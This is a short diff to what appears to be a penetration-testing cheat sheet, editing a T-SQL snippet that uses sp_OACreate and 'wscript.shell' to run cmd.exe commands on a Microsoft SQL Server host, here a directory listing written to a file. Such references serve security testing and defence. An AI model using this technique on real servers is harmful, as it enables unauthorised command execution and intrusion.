@@ -94,7 +94,7 @@ EXEC sp_OADestroy @shell;
 -- Alternative syntax using SP_OACREATE (simpler)
 DECLARE @execmd INT;
 EXEC sp_OACreate 'wscript.shell', @execmd OUTPUT;
-EXEC sp_OAMethod @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c dir C:\ > C:\output.txt';
+EXEC sp_OAMethod @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c dir C:\ > C:\output.txt', 0, 0;
 EXEC sp_OADestroy @execmd;
 ```
 
